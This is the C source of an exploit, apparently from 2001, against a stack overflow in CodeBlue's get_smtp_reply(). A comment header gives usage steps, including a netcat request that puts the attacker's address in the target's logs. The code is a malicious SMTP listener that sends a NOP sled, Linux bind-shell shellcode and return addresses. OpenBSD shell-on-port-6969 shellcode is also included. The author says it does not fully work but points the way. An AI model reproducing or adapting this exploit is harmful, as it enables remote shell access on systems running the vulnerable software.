/*
 * hi, this is an exploit that doesnt work. it should be enough of a point in
 * the right direction though. the overflow is in get_smtp_reply(), codeblue.c
 * is pretty damn poor, there are more!!!
 *
 *
 * To use this against a webserver (A) using codeblue.
 *
 * $ printf "GET /scripts/root.exe\r\n\r\n" | nc A 80
 *
 * this will add an entry in the access log.
 *
 * ON THE SAME HOST:
 *
 * # ./mystic_anus 25
 *
 * wait a while.
 *
 * when codeblue runs it will pull your ip from the logs, connect to your port
 * 25 and try to send you a mail. because mystic is an idiot, you will get a
 * shell with the openbsd code!!!
 *
 * i like exclamation marks !!!!
 *
 * krad haxxor props: dedmunk (happy now#@!!#@) ph1ll1p, caddis, buo, solace,
 * everyone on #cw , everyone in paris (you have a lovely city, i had a lovely
 * time last weekend, thankyou!!!) dedmunk, everyone at netcraft (esp Mike,
 * hi!), everyone in sydney, dedmunk, everyone i go drinking with, anyone who
 * lives in london, marlinspike (yo!), the woman who sells me my cigarettes in
 * the morning on the way into work, thomas greene, dedmunk, adam, durab, sh00ter.
 *
 * propz to dme#!@#!@
 *
 * dont forget:
 *
 * $Header: /usr/src/Projects/codeblue/codeblue.c,v 1.1 2001/08/02 20:40:01 root Exp root $
 *
 ******************************************************************************************
 *                      -[ G O D  B L E S S  A M E R I C A ]-                             *
 ******************************************************************************************
 *
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define OF 2048 /* this is bigger than needed */

/* Optimized the code, now it works better in bad situations */
/* i dont know who wrote this, sorry, if you wrote it, let me know */

char lunix_shellcode[]=
"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";


/*
 shell on port 6969/tcp shellcode for OpenBSD by noir
*/

long bsd_shellcode[]=
{
  0x4151c931,0x51514151,0x61b0c031,0x078980cd,
  0x4f88c931,0x0547c604,0x084f8902,0x0647c766,
  0x106a391b,0x5004478d,0x5050078b,0x68b0c031,
  0x016a80cd,0x5050078b,0x6ab0c031,0xc93180cd,
  0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,
  0x50078b51,0xb0c03150,0x4180cd5a,0x7503f983,
  0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,
  0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,
  0x01b0c031,0xd8e880cd,0x2fffffff,0x2f6e6962,
  0x90416873
};

int main(int argc, char *argv[])
{
	struct 	sockaddr_in sock_in;
	struct 	sockaddr_in sock_out;
	char 	*port = "25";
	int 	fd, a;
	int 	len;
	int		opt;
	char bigbuf[OF];
	char *p;
	long lunix_resp = 0xbfffe0ac;
	long bsd_resp = 0xdfbfc068;
	char *moo = "220 ";

	long resp = lunix_resp;
	char *shellcode = lunix_shellcode;

	printf("strlen scode = %d\n", strlen(shellcode));
	if (argc == 2)
		port = argv[1];

	if (argc > 2) {
		fprintf(stderr, "usege: %s [port]\n", argv[0]);
		exit(1);
	}

	resp += 8;

	p = bigbuf;
	memcpy(p, moo, 4);
	p += 4;
	memset(p, '\x90', 1020 - strlen(shellcode));
	p += 1020 - strlen(shellcode);
	memcpy(p, shellcode, strlen(shellcode));
	p += strlen(shellcode);
	memcpy(p, &resp, 4);
	p += 4;
	memcpy(p, &resp, 4);
	p += 4;
	memset(p, '\n', 4);

	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(1);
	}

	memset(&sock_in, 0, sizeof(sock_in));
	sock_in.sin_family = AF_INET;
	sock_in.sin_port = htons(atoi(port));
	sock_in.sin_addr.s_addr = INADDR_ANY;
	len = sizeof(sock_in);

	opt = 1;
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) == -1) {
			perror("setsockopt");
			exit(1);
	}

	if (bind(fd, (struct sockaddr *)&sock_in, len) < 0) {
		perror("bind");
		exit(1);
	}

	if (listen(fd, 5) < 0) {
		perror("listen");
		exit(1);
	}

	printf("listening on port %d\n", atoi(port));

	for (;;) {
		len = sizeof(sock_out);
		if ((a = accept(fd, (struct sockaddr *)&sock_out, &len)) < 0){
			perror("accept");
			exit(1);
		}
		printf("got a connection from %s\n", inet_ntoa(sock_out.sin_addr));
		fflush(stdout);

		write(a, bigbuf, sizeof(bigbuf));
		close(a);
	}

	return(1);

}
